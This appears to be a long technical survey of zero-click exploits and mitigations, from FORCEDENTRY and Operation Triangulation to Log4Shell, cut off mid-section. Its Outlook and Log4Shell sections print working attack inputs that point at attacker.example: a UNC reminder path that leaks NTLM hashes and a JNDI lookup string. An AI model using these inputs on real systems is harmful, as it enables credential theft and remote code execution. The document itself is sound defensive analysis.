A conventional exploit needs a moment of human cooperation: a link tapped, an attachment opened, a macro enabled, a permission granted. The zero-click class dispenses with that moment entirely. The victim does nothing — does not even see a notification — and yet, by the time their handset's screen has finished rendering an incoming message, a remote adversary may already hold arbitrary code execution inside a privileged process, a foothold in the kernel, and an implant resident in physical memory. The interaction was never required, because the interaction was never the point. The point is the parser.

This is among the most consequential offensive capabilities in modern computing, and it is also among the most narrowly held. The full chains that achieve it are expensive, fragile, jealously guarded, and — when they are caught at all — usually caught in the hands of state intelligence services and the mercenary firms that supply them. They are deployed against journalists, dissidents, lawyers, and diplomats, because those are the targets for whom a seven-figure exploit makes economic sense.2 Understanding how they work is no longer optional for anyone building, defending, or reasoning about networked systems. The techniques that defeat the most hardened consumer device on earth are the same techniques, in cruder form, that defeat everything below it.

This study treats the zero-click attack as an engineering object. It defines the threat model with precision, walks the kill chain stage by stage, dissects the canonical exploits in technical detail — from the JBIG2 "weird machine" of FORCEDENTRY to the undocumented hardware register that anchored Operation Triangulation — surveys the surfaces beyond messaging where the same logic applies, and closes on the structural mitigations that are, for the first time, beginning to shift the economics back toward the defender.

§ 01The interaction-free threat model

Begin with a definition stated carefully, because the looseness with which "zero-click" is used in the trade press obscures what actually matters. A zero-click attack is one in which the complete exploitation — from initial code execution through whatever the attacker's objective requires — proceeds without any action by the targeted user beyond the ordinary, passive operation of their device. The distinguishing property is not that the attack is remote, nor that it is silent, though it is usually both. The distinguishing property is reachability without consent: there exists a code path, reachable by an unauthenticated remote party, that processes attacker-controlled data automatically, before and independent of any decision the user might make.

Contrast the adjacent classes. A one-click attack still requires the victim to perform a single deliberate act — typically opening a link that navigates a browser to an exploit-serving page. One-click chains are cheaper and more plentiful precisely because the victim does part of the attacker's work, advancing execution into a rich, scriptable rendering engine. The mercenary product Predator, for instance, was frequently delivered through one-click links and network injection, with only some components reaching the device through automatic in-application rendering.4 The economic and operational gulf between one-click and zero-click is enormous: a one-click campaign can be defeated by a cautious target, while a zero-click campaign defeats caution by definition.

The substrate of every zero-click attack is automatic processing of untrusted input. Modern platforms are saturated with it. A messaging client must decode an inbound attachment to render a thumbnail before the user has glanced at the conversation. A mail client fetches remote content and parses MIME structure as messages arrive. A Bluetooth stack negotiates service descriptors with any device in range. A cellular modem parses signaling from whatever base station it associates with. A logging framework serializes user-supplied strings into a log sink. Each of these is a place where data the attacker controls is interpreted by code the attacker does not — and any memory-safety or logic defect along that path is, in principle, a zero-click vulnerability. Two structural observations follow from this table and will recur throughout. First, the shared-codec row is special: an image- or video-decoding defect is not confined to one channel but is reachable through every channel that auto-renders that format, which is to say nearly all of them. This is why a single bug in a compression library can simultaneously be a browser bug, a messaging bug, and a mail bug. Second, the server-side rows invert the usual geometry: here it is the server that automatically processes the attacker's input, so "zero-click" describes the absence of any administrator action rather than any end-user action. A single unauthenticated request that triggers code execution is, from the server's perspective, exactly as interaction-free as a malicious iMessage is from the phone's.

Framing

Reachability is the whole game

A memory-corruption bug buried in code that no remote party can reach is a quality issue, not a security emergency. The same bug sitting on an auto-invoked parse path for inbound, attacker-shaped data is a zero-click vulnerability worth millions. The defect is often identical; the reachability is what changes its value by six orders of magnitude. Most platform hardening against this class is therefore an attack on reachability — sandboxing the parser, narrowing what it can touch — rather than an attempt to eliminate every bug.

§ 02Economics of a delivered exploit

The reason zero-click capability is rare is that it is costly to produce and costly to keep working, and those costs structure who possesses it and how it is used. On the open acquisition market, the price signal is unambiguous. The exploit broker Zerodium has publicly advertised payouts reaching up to USD 2.5 million for a full Android zero-click chain and USD 2 million for the equivalent on iOS, with interaction-free remote code execution in messaging applications sitting at the very top of the schedule — above one-click browser chains, above local privilege escalation, above almost everything else.3 Those figures are advertised acquisition prices; the operational cost to a vendor of developing, weaponizing, and continuously maintaining such a chain against a moving target is higher still.

That economic floor is exactly why the deployment of these tools clusters where it does. Google's Project Zero, reviewing in-the-wild zero-days, found that the genuinely novel and sophisticated exploitation of recent years has been concentrated in a small number of chains, with the FORCEDENTRY iMessage exploit standing out as the rare public example of a capability long rumored but seldom seen.1 When a capability costs millions and burns the moment it is patched, it is not sprayed indiscriminately; it is reserved for targets whose compromise is worth the expenditure and the disclosure risk.

The empirical record of who those targets are is now extensive. The 2021 forensic work coordinated around the so-called Pegasus Project documented the use of NSO Group's spyware against a long list of journalists, human-rights defenders, lawyers, and political figures, with the technical methodology for detecting the infections published in detail by Amnesty International's Security Lab.2 The pattern is consistent across vendors and campaigns: interaction-free capability is a precision instrument of state surveillance, and civil society is its principal casualty.

This concentration has drawn a policy response that itself shapes the landscape. In 2021 the U.S. Department of Commerce added NSO Group and other surveillance vendors to the Entity List, restricting their access to U.S. technology;39 in 2023 an Executive Order restricted U.S. government use of commercial spyware that had been implicated in abuses.40 These measures do not eliminate the supply, but they raise its cost and narrow its market — a deliberate intervention on the same economic variable that the technical mitigations attack from the other side. The strategic logic of the entire defensive program, hardware and policy alike, is to make a delivered exploit too expensive to develop, too fragile to maintain, and too risky to deploy.

§ 03Anatomy of a zero-click chain

A working zero-click capability is almost never a single bug. It is a chain — a sequence of distinct vulnerabilities, each chosen to advance the attacker across one boundary of the defense-in-depth stack, composed so that the output of one stage is the precondition of the next. The reason is structural: the first bug typically lands the attacker inside a heavily sandboxed parsing process with almost no privilege, and every meaningful objective lies on the far side of additional barriers. Understanding the chain means understanding the barriers and the move that crosses each one.

Stage one, delivery, is the act of getting attacker-shaped bytes onto an automatic parse path. For messaging this is sending the message; for proximity attacks it is transmitting the malformed frame; for servers it is issuing the request. Nothing is exploited yet — this stage merely places the input where the vulnerable code will consume it without asking.

Stage two, the memory-corruption primitive, is where the parser mishandles that input. The recurring defect families are familiar to anyone who works in unsafe languages: integer overflows that cause an undersized allocation followed by an oversized write; heap buffer overflows that corrupt adjacent object metadata; type confusions that cause one object's fields to be interpreted as another's; use-after-free conditions that hand the attacker a dangling pointer. What the attacker wants from this stage is not a crash but a primitive — a controlled, repeatable ability to read or write memory at chosen offsets. Turning a single overflow into a stable read/write capability is the craft that separates a proof-of-concept from a weapon.

Stage three converts that primitive into code execution. On any modern target this requires defeating address-space layout randomization, because a write primitive is useless if the attacker does not know where to aim it. In the zero-click setting the information leak that defeats ASLR is itself often interaction-free — and sometimes startlingly indirect. Project Zero documented that on pre-iOS-14 platforms an attacker could infer the base address of the shared library cache simply by observing the timing of automatic delivery receipts as a parsing service crashed and restarted, turning the platform's own acknowledgement mechanism into a side channel against its randomization.7 With layout known, the attacker pivots the write primitive into hijacked control flow.

Stage four is the sandbox escape. Code execution in a tightly confined parser process is, by design, nearly worthless on its own — the process can touch little, talk to almost nothing, and reach no user data. Escaping it requires a second, independent vulnerability, this time in the interface between the sandboxed process and some more privileged component it is permitted to talk to. The most elegant escapes use no memory corruption at all, only logic flaws in that interface — a category that, as the case studies will show, attackers have demonstrated in the wild.

Stage five reaches the kernel and establishes the implant. A further bug in the kernel's syscall surface yields the read/write-anywhere capability needed for total control; on the most recent hardware, an additional barrier — a hardware-enforced page-protection layer — must also be defeated before protected kernel memory can be modified. With the kernel owned, the attacker installs the surveillance payload, frequently choosing a memory-only implant that leaves no disk artifact and is erased on reboot, trading persistence for stealth.

The weird machine

One concept deserves isolation because it recurs at the frontier of this craft and because it reframes what "a parser" even is. A complex file format with conditional and arithmetic operators is not merely data; under the influence of a memory-corruption bug it becomes an execution environment. The academic formalization, developed by Thomas Dullien among others, names this the weird machine: a corrupted program's behavior, driven by crafted input, realizes a computational model that the original developers never intended to exist, executing "programs" written in the vocabulary of the format's own features.5 The exploit author's task becomes programming this unintended machine. FORCEDENTRY, examined next in detail, is the canonical demonstration: its authors built a small, general-purpose computer entirely out of the logical operators of an image-compression format, and ran their bootstrap code on it. The weird machine is the reason that "just parsing an image" can be Turing-complete in the presence of a bug.

§ 04iMessage and the BlastDoor doctrine

No surface has been more thoroughly exercised by zero-click attackers than Apple's iMessage, and the reasons are instructive because they generalize. iMessage is enabled by default on every iPhone, is addressable by anyone who knows a phone number or Apple ID, and — to deliver the rich experience users expect — parses an extraordinary variety of attachment types automatically, generating previews and transcoding media long before the recipient looks at the conversation. The combination of universal reachability, default-on status, and aggressive automatic parsing of complex formats is precisely the combination that maximizes zero-click attack surface. For years, researchers and real-world attackers alike found remote-code-execution bugs in this pipeline and built interaction-free exploits on them.7

Apple's structural response, introduced in iOS 14 and reverse-engineered in detail by Project Zero's Samuel Groß, was BlastDoor. Rather than attempting to find and fix every parsing bug individually — a losing game — Apple moved almost all parsing of untrusted iMessage data into a new, tightly sandboxed service. BlastDoor is written largely in Swift, a memory-safe language that makes the classic corruption bugs far harder to introduce in the first place, and it is confined by an unusually strict sandbox profile.7 Groß's analysis records just how strict: BlastDoor is permitted to reach only a handful of system services, its filesystem access is heavily curtailed, and outbound network access and driver interaction are forbidden outright. The decoded, structured result is what crosses the boundary back to the rest of the system — not the raw, dangerous bytes.

BlastDoor arrived with two companion mitigations aimed squarely at the chain stages described above. To kill the delivery-receipt timing side channel against ASLR, iOS 14 added logic to detect repeated crashes of a targeted service and re-randomize the shared cache for that service on its next launch, rendering the inference useless.7 And to blunt brute force, the platform imposes exponential throttling on restart of a repeatedly crashing service, so that an attacker who needs many attempts pays an ever-increasing time penalty. Groß's assessment was that, given the constraints of backward compatibility, these changes were close to the best available, and they should meaningfully raise the cost of attacking the surface.7

The BlastDoor doctrine — isolate the parser, write it in a safe language, starve it of capability, and re-randomize under attack — became the template for hardening untrusted-input surfaces across the industry. But a doctrine is only as strong as its completeness, and the next section is the story of the one path the doctrine missed.

§ 05FORCEDENTRY: the weird machine

In 2021, Citizen Lab, examining the iPhone of a Saudi activist, recovered a zero-click iMessage exploit they named FORCEDENTRY — a deliberate jab at the BlastDoor sandbox it sidestepped.8 They shared a sample with Apple and with Google's Project Zero, whose subsequent technical analysis, authored by Ian Beer and Samuel Groß, described it as among the most technically sophisticated exploits they had ever seen.6 The exploit was attributed to NSO Group and used to deploy the Pegasus implant; Apple assigned the vulnerability CVE-2021-30860 and patched it in iOS 14.8.9 Its mechanism is worth following closely, because it is the clearest demonstration in the public record of every concept in §03.

The gap in the wall

The first move was to avoid BlastDoor entirely. Beer and Groß traced how iMessage, wanting to loop received GIFs endlessly, passed any attachment with a .gif extension to a copy routine in the IMTranscoderAgent process — which ran outside the BlastDoor sandbox — and how that routine, despite its name, did not merely copy the file but re-rendered it through CoreGraphics.6 Crucially, the file's actual contents were never required to be a GIF. The attacker sent a PDF carrying the .gif extension, and CoreGraphics dutifully invoked its PDF decoder. One legacy convenience feature, running on the wrong side of the sandbox boundary, reopened the entire attack surface that BlastDoor had been built to close.

The integer overflow

Inside that PDF was a stream encoded with JBIG2, a bi-level image-compression format whose decoder in CoreGraphics derives from the open-source Xpdf codebase. The defect was a textbook integer overflow in the handling of JBIG2 symbol-dictionary segments: when the decoder summed the sizes of referenced segments to size an allocation, the arithmetic could wrap, producing an undersized heap buffer into which subsequent decoding wrote out of bounds, corrupting adjacent heap objects.6 The shape of the bug is mundane — the kind of overflow that has appeared in C image parsers for decades. What the attackers did with it was not.

Building a computer out of an image

JBIG2 has no scripting and no notion of general computation. But it does support a refinement-and-region model in which the decoder combines bitmaps using logical operators. Beer and Groß showed that, with the bounds confusion the overflow provided, these operators could be marshalled to emulate arbitrary logic gates — AND, OR, XOR, NOT — operating on attacker-chosen memory. From logic gates one can construct any circuit, and from arbitrary circuits operating on memory one obtains, in effect, a small general-purpose processor: registers, an adder, comparison, conditional logic. The entire apparatus runs inside a single decompression pass over the crafted JBIG2 stream.6 This is the weird machine made concrete. The exploit's bootstrap logic was a "program" written for this emulated architecture, assembled from nothing but the features of an image format and the leverage of one integer overflow.

JBIG2 doesn't have scripting capabilities, but combined with a vulnerability it gains the ability to emulate circuits of arbitrary logic gates operating on arbitrary memory.

The logic-bug escape

Reaching code execution in the rendering context was only the first half. The implant lived on the far side of another sandbox, and crossing it required a second vulnerability. Reviewing the year's in-the-wild exploits, Project Zero singled out FORCEDENTRY's sandbox escape as remarkable for a different reason: it was one of the few escapes seen in the wild that used only logic bugs rather than memory corruption.1 Where most escapes batter their way across the boundary by corrupting memory in a privileged peer, this one walked through it by abusing the legitimate semantics of an inter-process interface. Logic-only escapes are coveted precisely because the memory-safety mitigations that increasingly frustrate corruption-based exploitation do nothing to stop them.

FORCEDENTRY thus instantiates the full chain: a delivery that bypassed the sandbox via a legacy path, an integer-overflow primitive in a codec, that primitive elaborated into a Turing-complete weird machine, and a logic-only escape onward toward the implant. It is the reference specimen against which every subsequent iMessage chain is measured — and the proof that a single overlooked path outside the sandbox can void an otherwise sound architecture.

§ 06Operation Triangulation

If FORCEDENTRY is the most elegant public zero-click exploit, Operation Triangulation is the most elaborate. Discovered by Kaspersky within its own corporate network — detected by monitoring Wi-Fi traffic through the company's own SIEM platform rather than on the endpoints themselves — it was a campaign against iOS devices using a chain of four zero-days, and its full technical reconstruction by Kaspersky's GReAT team, presented at the 37th Chaos Communication Congress, exposed a final stage so unusual that it reads more like hardware archaeology than software exploitation.10 The campaign affected devices through iOS 16.2, and Apple patched the constituent vulnerabilities across mid-2023.11

The chain began, again, with an invisible iMessage attachment processed without any user action. Its components, each assigned a CVE, illustrate how many independent capabilities a modern chain must assemble:1012

The entry point, CVE-2023-41990, is itself a small marvel of attack-surface archaeology: it lived in an undocumented ADJUST TrueType font instruction that Apple had carried since the early 1990s before a patch finally removed it.10 The fact that the bug sat in a three-decade-old proprietary opcode speaks to how deep attackers will dig for an automatically reachable parse path.

Stages inside stages

The exploitation that followed is a study in defensive evasion. The initial stages used return- and jump-oriented programming together with logic written in the NSExpression / NSPredicate query language — the same logic-bug-friendly machinery seen in FORCEDENTRY's lineage — to patch the JavaScriptCore environment so that a privilege-escalation exploit could be written in JavaScript. That JavaScript stage was deliberately obfuscated to the point of unreadability and still ran to roughly 11,000 lines, devoted mostly to parsing and manipulating JavaScriptCore and kernel memory. To gain native power from script, it abused JavaScriptCore's DollarVM ($vm) debugging feature, using it to manipulate the engine's own memory and to call native API functions directly.10 Kernel read/write then came from the integer overflow in XNU's memory-mapping syscalls.

The last hardware mystery

The stage that gives the campaign its mythic status is CVE-2023-38606. On recent Apple silicon, even an attacker with kernel read/write cannot freely modify the most sensitive regions of kernel memory, because a hardware-enforced Page Protection Layer stands in the way. The attackers defeated it using undocumented memory-mapped I/O registers in the A12–A16 system-on-chip — registers that do not appear in the device tree, are not used by the firmware, and are likely a debugging or testing facility left enabled, a fragment of security-through-obscurity that should never have been reachable.10 By writing to these registers, the exploit bypassed the hardware protection and gained the ability to alter protected memory — the final barrier between kernel read/write and total control. Kaspersky's researchers were explicit that this hardware feature was not publicly documented, which posed a profound question they could not answer: how did the attackers learn it existed at all?11

Why it matters

Hardware barriers are not a backstop if their secrets leak

The Page Protection Layer is exactly the kind of hardware barrier defenders rely on to contain an attacker who has already won at the software layer. Triangulation showed that such a barrier can be undone by an undocumented register known to the adversary — a reminder that "security through obscurity" at the silicon level is a liability the moment the obscurity fails, and that the provenance of such knowledge is itself a serious intelligence question.

With every barrier down, the chain was almost anticlimactically tidy. It launched a process to scrub the exploitation artifacts from the device, opened an invisible Safari instance to fetch a validation stage, ran a further WebKit exploit to execute shellcode, re-used the kernel and hardware bugs in a compiled payload to reach root, validated the victim, and finally deployed TriangleDB — an implant that lived only in memory and was erased on reboot, after which the attackers could simply re-send the message and re-infect.10 The memory-only design is the recurring stealth trade: forfeit persistence to forfeit forensic residue.

§ 07BLASTPASS and the codec problem

In September 2023, Citizen Lab caught another fully interaction-free iMessage chain — dubbed BLASTPASS — compromising a current, fully patched iPhone running iOS 16.6 belonging to a Washington, D.C. civil-society organization, and again delivering NSO Group's Pegasus. The delivery vector was novel in its packaging: malicious images carried inside PassKit attachments — the .pkpass bundles used by Apple Wallet — which iMessage processed automatically to render a preview. Apple assigned two identifiers, CVE-2023-41064, a buffer overflow in the ImageIO framework, and CVE-2023-41061, a validation flaw in Wallet, and shipped emergency fixes.1315 The chain bypassed BlastDoor, and Apple confirmed to Citizen Lab that Lockdown Mode blocked it.

One bug, every application

What makes BLASTPASS pivotal is not the messaging packaging but the nature of the underlying bug, which connects to the single most far-reaching zero-click vulnerability of the decade. The ImageIO overflow is widely understood to be the same defect, in the same code, that was independently disclosed as CVE-2023-4863: a heap buffer overflow in libwebp, Google's ubiquitous WebP image library.14 The fault lay in the construction of Huffman tables during decoding of lossless (VP8L) WebP data — in the BuildHuffmanTable routine reached through ReadHuffmanCodes. The function allocates a table buffer of a precomputed size; crafted code-length data could advance the write pointer past that allocation, yielding an out-of-bounds heap write reachable by anything that decoded an untrusted WebP image.14

The blast radius is the entire point. libwebp is embedded in Chrome, in Firefox, in Apple's image stack, in Android, and — through frameworks such as Electron — in a vast population of desktop applications. A single bug in it was therefore simultaneously a browser zero-day, a messaging zero-day, and a mail zero-day. The disclosure was attended by genuine confusion, because the issue was first filed narrowly against Chrome before being recognized as a library-level flaw; a second identifier, CVE-2023-5129, was briefly issued to capture the broader scope at maximum severity before being withdrawn as a duplicate.14 The CVE machinery's difficulty in representing "the same bug, reachable everywhere" is itself a lesson in why shared codecs are the most dangerous row in the taxonomy.

The pattern was not isolated. Within weeks, CVE-2023-5217, a heap buffer overflow in the VP8 encoding path of the libvpx video library, was found exploited in the wild; Google's Threat Analysis Group connected the activity to a commercial surveillance vendor delivering the Predator implant.16 Two universal media libraries, two heap overflows, two in-the-wild zero-click campaigns, within a single month. The codec problem is not a footnote to the messaging story; it may be the main story, because it is the one bug that every channel shares.

§ 08WhatsApp and the VoIP surface

Before iMessage became the canonical surface, the 2019 WhatsApp exploit demonstrated a different and equally instructive automatic-parse path: the voice-call signaling stack. Tracked as CVE-2019-3568, it was a buffer overflow in WhatsApp's VoIP implementation, triggered by a specially crafted series of control packets sent to a target's phone number. Its defining property — the property that made it a true zero-click — is that the vulnerable handler executed before the call was answered. Merely placing the call, even one the victim never picked up, was sufficient to corrupt memory and deliver the Pegasus implant.17

Check Point's analysts reconstructed the bug by diffing the patched WhatsApp binary against its vulnerable predecessor. They located the fix in a major handler in the call-control module and observed that the patch added a bounds check constraining a length argument to a maximum of 1,480 bytes — confirming, in their debugging, that the function was indeed invoked during call setup, prior to the user accepting.18 The lesson generalizes beyond WhatsApp: any protocol that must process inbound data to establish a session — to ring the phone, to negotiate the media channel, to render the preview — has, by necessity, an automatic parse path that runs before consent, and that path is fair game.

The aftermath of the WhatsApp case also marked a shift in how the industry confronts mercenary vendors. WhatsApp's parent company sued NSO Group, alleging the firm had reverse-engineered the application to build and sell an exploit that could plant spyware merely by initiating a call — a landmark attempt to impose legal liability on the supply side of the zero-click market, rather than treating each compromise as an isolated technical event.19 Where §02 described policy pressure on the vendors, the litigation here is the same strategy pursued through the courts: raise the cost and the risk of producing these capabilities at all.

§ 09The wireless and cellular perimeter

Messaging requires that the attacker know an address. The proximity surfaces require only that the attacker be near — and they process attacker-controlled frames at a layer beneath the application entirely, often beneath the operating system's notice. Three classes deserve treatment: short-range radio stacks, peer-discovery protocols, and the cellular baseband.

Stagefright: the SMS forerunner

The 2015 Stagefright family, disclosed by Joshua Drake of Zimperium, was the watershed that made the zero-click concept legible to a mass audience.20 The bugs lived in libstagefright, Android's media-processing library, and the canonical instance, CVE-2015-1538, was an integer overflow in the handling of the stsc atom within MP4 files.21 The delivery channel was MMS: messaging applications of the era automatically fetched and pre-processed inbound multimedia so that a preview would be ready, which meant the malicious media file was parsed by the privileged mediaserver process the moment it arrived — before the user opened, or even saw, the message. The family spanned numerous identifiers and Android versions from 2.2 through 5.1, exposing on the order of 950 million devices, and Drake demonstrated full remote code execution at Black Hat USA 2015. The structural fix mirrored what would later become the BlastDoor doctrine: Google modified its messaging clients to stop auto-retrieving MMS media, and Android subsequently moved media codecs into more constrained, isolated processes — once again attacking reachability rather than chasing every bug.

BlueBorne: code execution from the air

If MMS needs a phone number, Bluetooth needs nothing but proximity. In 2017, Armis disclosed BlueBorne, a set of eight vulnerabilities across the Bluetooth stacks of Android, Windows, Linux, and iOS, collectively reachable by an attacker in radio range with no pairing, no authentication, and no requirement that the target be discoverable — the victim is given no signal that anything is occurring.22 The remote-code-execution members were the most severe: CVE-2017-0781 and CVE-2017-0782, heap-corruption flaws in the Android BNEP and PAN networking profiles; CVE-2017-1000251, a stack overflow in the Linux kernel's L2CAP handling; and CVE-2017-14315, a heap overflow in Apple's proprietary Low Energy Audio Protocol affecting iOS versions before 10. Armis estimated the affected population at over eight billion devices. BlueBorne's enduring significance is its demonstration that a default-on radio stack, parsing service-negotiation data from anyone nearby, is a zero-click surface every bit as real as a messaging app — and one the user cannot decline without disabling the radio.

AWDL: one researcher, six months, any iPhone in range

The single most vivid proximity result is Ian Beer's 2020 Project Zero exploit of Apple Wireless Direct Link, the peer-to-peer protocol underlying AirDrop and related features. Beer found a buffer overflow — an out-of-bounds memory operation in the parsing of AWDL synchronization frames — assigned CVE-2020-3843, and over roughly six months of solo work, much of it during lockdown, developed it into a wormable, radio-proximity, zero-click exploit yielding full device control on an iPhone 11 Pro.23 Two details make it required reading. First, the hardware: his attack rig was a Raspberry Pi and two off-the-shelf Wi-Fi adapters, totalling under one hundred dollars. Second, the reachability: AWDL is enabled by default, and Beer showed that even when it was off, an attacker could force it on remotely using Bluetooth Low Energy advertisements — the very signals a device emits when it wants to share a file. Beer's own framing was the one that should stay with any defender: the takeaway is not that no one would spend six months to attack a single phone, but that one person, working alone, built a capability to seriously compromise any iPhone user they came near.

One person, working alone in their bedroom, was able to build a capability to seriously compromise iPhone users they'd come into close contact with.

— Ian Beer, on the AWDL radio-proximity exploit [23]

Baseband: beneath the operating system

Deepest of all is the cellular baseband — the firmware on the modem that parses signaling from the network. It is a uniquely dangerous surface because it processes attacker-influenced data continuously and autonomously, often runs with extensive memory access, and is largely invisible to the operating system's defenses. Nitay Artenstein's 2017 Broadpwn work targeted the closely related Broadcom Wi-Fi system-on-chip, demonstrating a fully remote, wormable compromise of the wireless SoC through CVE-2017-9417 with no user interaction.24 Project Zero's Gal Beniamini, in a multi-part study of the same Broadcom stack, traced how an attacker progresses from the isolated Wi-Fi chip into the application processor itself, illuminating the cross-processor escalation path that makes radio-SoC bugs so consequential.25 Vulnerabilities in the modem's own protocol interfaces — the kind found periodically in widely deployed cellular chipsets — extend the same logic to the carrier signaling path, where the attacker need not be in Wi-Fi or Bluetooth range at all, only on the network. The baseband is the surface where "zero-click" shades into "zero-awareness": the exploited code is one the user can neither see nor disable.

§ 10Mail clients and credential leaks

Email is one of the oldest automatic-parse surfaces, and it remains productive for two different objectives: code execution and credential theft.

The iOS Mail case and the question of exploitability

In 2020, ZecOps reported a pair of vulnerabilities in the iOS Mail application — an out-of-bounds write and a heap overflow, both rooted in the MFMutableData implementation within the MIME-handling library, where the return value of the ftruncate() system call went unchecked. The flaws were assigned CVE-2020-9818 and CVE-2020-9819. On iOS 13 the heap overflow could be triggered with no interaction — the mail application processing a crafted message in the background was enough — while on iOS 12 the same path required a tap.26 The case is included here as much for its epilogue as its mechanism. ZecOps asserted the bugs had been exploited in the wild against high-value targets; Apple, after investigation, stated it had found no evidence of in-the-wild exploitation and characterized the flaws as insufficient to compromise a device on their own.27 Both positions can be technically reconcilable — the bugs alone yielded only constrained access within the Mail sandbox and would have required a separate kernel escape for full control — and the episode is a useful caution that "zero-click vulnerability" and "weaponized zero-click chain" are different claims requiring different evidence.

Outlook and the NTLM leak: zero-click without code execution

The 2023 Outlook vulnerability, CVE-2023-23397, is the clearest demonstration that a zero-click attack need not involve memory corruption or code execution at all to be devastating. It is a critical elevation-of-privilege flaw, rated 9.8, exploited by sending a crafted message — typically a calendar or task item — carrying the extended MAPI property PidLidReminderFileParameter set to a UNC path pointing at an attacker-controlled SMB server, paired with PidLidReminderOverride to force the custom reminder behavior.28 When Outlook processed the reminder, it attempted to retrieve the specified sound file from the network share, and in doing so initiated NTLM authentication against the attacker's server — leaking the victim's Net-NTLMv2 hash with no user interaction whatsoever. The attacker can then relay that hash to authenticate as the victim against other services, or attempt to crack it offline.29

malicious reminder property -> SMB authentication leakCVE-2023-23397
// Extended MAPI properties set on a crafted appointment/task item:
PidLidReminderFileParameter = "\\attacker.example\share\ding.wav"   // UNC -> attacker SMB
PidLidReminderOverride      = true                                // force the custom sound

// On reminder fire, Outlook reaches the share over SMB (TCP/445)
// and authenticates -> Net-NTLMv2 hash sent to attacker.
// No link, no attachment opened, no click. Triggered on processing.

Two properties make this case strategically important. First, the absence of code execution sidesteps an entire generation of memory-safety mitigations — there is no overflow to detect, no shellcode to block, only the legitimate mechanics of authentication abused against the user. Second, the captured credential is most dangerous inside enterprise Active Directory environments, where NTLM relay can pivot a single leaked hash into lateral movement and domain compromise. Microsoft's analysis attributed exploitation to a Russian state actor targeting European organizations, and the patch shipped in March 2023.28 It is the proof that "interaction-free" is a property of the trigger, not of the payload: the payload here is a stolen credential, and it costs the attacker nothing but a well-formed message.

§ 11Server-side zero-click

Everything so far has concerned a victim's personal device. But the defining characteristic of the class — automatic processing of attacker-controlled input, with no deliberate human action required — applies with equal force to servers, where it produces the highest-volume, most economically damaging incidents of all. On a server the "user" whose inaction defines the zero-click property is the administrator; the input is an inbound request; and the parse path is the request-handling or logging logic that runs the instant the request arrives.

ProxyLogon: arbitrary command execution through port 443

The 2021 Microsoft Exchange chain known as ProxyLogon, discovered by Orange Tsai of DEVCORE, began with CVE-2021-26855, a server-side request forgery in the Exchange Client Access Service. A flaw in how the front end computed the back-end target — taking direction from an attacker-controllable cookie — let an unauthenticated remote party send requests that the server processed as if it had authenticated them itself, defeating authentication entirely.30 Chained with CVE-2021-27065, a post-authentication arbitrary-file-write, the result was full remote code execution reachable, in Tsai's summary, through nothing but an open 443 port. There is no administrator action anywhere in this sequence; the server compromises itself upon receiving the request.

The campaign that exploited it is a case study in the danger of this surface at scale. The threat actor Microsoft tracks as HAFNIUM was found exploiting the same SSRF in the wild — discovered by Volexity in early 2021 — using a different downstream chain than Tsai's, a striking instance of independent discovery of the same root flaw.31 Mass exploitation followed disclosure, affecting tens of thousands of organizations and prompting an out-of-band patch and emergency directives.32 A related chain, ProxyShell, extended the same attack surface later that year. The Exchange saga established that a single pre-authentication request-routing flaw in widely deployed server software is, in impact, the server-side equivalent of a universal zero-click on every handset running a vulnerable app.

Log4Shell: the logger as attack surface

The most far-reaching server-side zero-click — arguably the most far-reaching vulnerability of the era — was Log4Shell, CVE-2021-44228, in the Apache Log4j 2 logging library, disclosed in December 2021 and rated the maximum 10.0.33 The mechanism is almost perversely simple. Log4j supported a message-lookup syntax that interpolated special expressions into log strings; an expression that requested a JNDI lookup over LDAP, if logged, caused Log4j to contact the attacker's server, retrieve a remote Java class, and instantiate it — executing attacker code.34 The catastrophe was reachability: applications log untrusted input constantly — a username, a User-Agent header, a chat message, a search query — so anywhere any attacker-controlled string reached a vulnerable logger, the application was exploitable, with no authentication and no user action.

the Log4Shell trigger stringCVE-2021-44228
// Place this anywhere the target application will LOG it:
//   an HTTP header, a form field, a chat message, a User-Agent...
${jndi:ldap://attacker.example/exploit}
//        |
//        +-- vulnerable Log4j performs a JNDI/LDAP lookup,
//            fetches a remote Java class, and instantiates it -> RCE
// No authentication. No user action. Just a logged string.

The remediation arc underscores how structural the fix had to be: an initial release disabled the behavior by default, a subsequent release removed the message-lookup capability altogether, and emergency guidance from national authorities urged immediate mitigation across an enormous installed base.35 Log4Shell is the purest illustration of the principle that anchored §01 — a feature that automatically interprets untrusted input is an attack surface — applied to a component so deep in the stack that almost no one had thought of it as a parser of attacker data at all. The logger was reachable, and reachability is the whole game.

§ 12Structural defenses

The defensive program against zero-click attacks has matured from reactive patching into a coherent strategy with a single objective: make the chain too expensive to build and too fragile to maintain. Because the chain crosses multiple boundaries, the defenses are layered to attack each transition in Figure 1 — and the most recent of them strikes at the memory-corruption primitive itself, the foundation on which nearly every chain in this study was built.

Memory safety at the source

The most durable mitigation is to eliminate the bug class. Rewriting parsers in memory-safe languages — Swift in BlastDoor's case, Rust elsewhere — removes the integer overflows, heap overflows, and use-after-frees that constitute stage two of the chain.7 A weird machine cannot be built on an overflow that cannot occur. This approach is bounded only by the vast quantity of existing unsafe code and by interfaces, like the logic-bug escapes seen in FORCEDENTRY and Triangulation, that memory safety does not touch.

Isolation and reachability reduction

Where unsafe parsing cannot be eliminated, it can be confined — the BlastDoor doctrine of §04. Sandboxing the parser into a capability-starved process means a successful stage-two exploit lands the attacker somewhere nearly useless, forcing the additional escape vulnerability of stage four and raising the bug count the chain requires. The companion techniques — re-randomizing the shared cache when a service is observed crashing, and exponentially throttling restarts — directly attack the stage-three ASLR defeat and the brute force that fragile primitives depend on.7

Exploit-mitigation hardware

Below the operating system, Apple silicon enforces Pointer Authentication, which cryptographically signs pointers so that the corrupted control-flow targets of a classic exploit fail validation, frustrating the return- and jump-oriented programming that stages three and four rely on. Operation Triangulation's Page Protection Layer is hardware of the same spirit — a barrier guarding sensitive kernel memory even from an attacker with kernel read/write — and its defeat by an undocumented register is precisely what made that campaign extraordinary rather than routine.10

Memory Integrity Enforcement: tagging the primitive away

The most significant recent development directly targets stage two for the entire device. In September 2025, Apple introduced Memory Integrity Enforcement on the iPhone 17 line and the A19 silicon — described by Apple's Security Engineering and Architecture team as the culmination of a five-year effort and the most significant memory-safety advance ever shipped in a consumer operating system.37 MIE combines secure typed memory allocators, the Enhanced Memory Tagging Extension developed with Arm running in synchronous mode, and tag-confidentiality protections against side-channel leakage of the tags. Memory is assigned secret tags and every access is checked in real time; a mismatch — the signature of an overflow or use-after-free reaching the wrong object — terminates the process at the first dangerous access rather than allowing the attacker to elaborate the corruption into a primitive.37

The decisive shift

Catching corruption at the first dangerous access

